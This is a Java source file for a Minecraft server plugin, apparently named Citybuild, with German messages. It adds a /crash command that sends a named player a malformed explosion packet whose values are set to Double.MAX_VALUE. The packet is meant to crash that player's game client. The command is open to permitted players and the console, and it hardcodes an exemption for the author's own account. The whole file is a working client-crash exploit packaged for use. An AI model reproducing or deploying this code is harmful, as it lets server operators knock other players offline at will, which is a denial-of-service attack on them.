package me.b3n3dkt.commands;

import me.b3n3dkt.Citybuild;
import net.minecraft.server.v1_16_R3.PacketPlayOutExplosion;
import net.minecraft.server.v1_16_R3.Vec3D;
import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.craftbukkit.v1_16_R3.entity.CraftPlayer;
import org.bukkit.entity.Player;

import java.util.Collections;

public class CMD_Crash implements CommandExecutor {
   public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
      Player p;
      if (sender instanceof Player) {
         p = (Player)sender;
         if (!p.hasPermission("jailedmc.command.crash")) {
            p.sendMessage(Citybuild.getNoperm());
         } else if (args.length != 1) {
            p.sendMessage(Citybuild.getPrefix() + "§cNutze bitte /crash <Spieler>");
         } else if (args.length == 1) {
            Player target = Bukkit.getServer().getPlayer(args[0]);
            if (target == null) {
               p.sendMessage(Citybuild.getPrefix() + "§cDer Spieler §8'§b" + args[0] + "§8' §cist nicht online!");
            } else if (target.getName().equalsIgnoreCase(p.getName())) {
               p.sendMessage(Citybuild.getPrefix() + "§cDu kannst dich nicht selbst Crashen!");
            } else if (target.getName().equalsIgnoreCase("b3n3dkt")) {
               p.sendMessage(Citybuild.getPrefix() + "§cDu kannst diesen Spieler nicht Crash!");
            } else {
               ((CraftPlayer)target).getHandle().playerConnection.sendPacket(new PacketPlayOutExplosion(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE, Float.MAX_VALUE, Collections.EMPTY_LIST, new Vec3D(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE)));
               Bukkit.getConsoleSender().sendMessage(Citybuild.getPrefix() + "§c7Der Spieler §8'§e" + args[0] + "§8' §7wurde von §8'§b" + p.getName() + "§8' §7gecrashed!");
               p.sendMessage(Citybuild.getPrefix() + "§7Du hast den Spieler §8'§b" + target.getName() + "§8' §7gecrashed");
            }
         }
      } else if (args.length != 1) {
         sender.sendMessage(Citybuild.getPrefix() + "§cNutze bitte /crash <Spieler>");
      } else if (args.length == 1) {
         p = Bukkit.getServer().getPlayer(args[0]);
         if (p == null) {
            sender.sendMessage(Citybuild.getPrefix() + "§cDer Spieler §8'§b" + args[0] + "§8' §cist nicht online!");
         } else if (p.getName().equalsIgnoreCase("b3n3dkt")) {
            sender.sendMessage(Citybuild.getPrefix() + "§cDu kannst diesen Spieler nicht crashen!");
         } else {
            ((CraftPlayer)p).getHandle().playerConnection.sendPacket(new PacketPlayOutExplosion(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE, Float.MAX_VALUE, Collections.EMPTY_LIST, new Vec3D(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE)));
            Bukkit.getConsoleSender().sendMessage(Citybuild.getPrefix() + "§c7Der Spieler §8'§b" + args[0] + "§8' §7wurde von §8'§bKonsole§8' §7gecrashed!");
            sender.sendMessage(Citybuild.getPrefix() + "§7Du hast den Spieler §8'§e" + p.getName() + "§8' §7gecrashed");
         }
      }
      return false;
   }
}
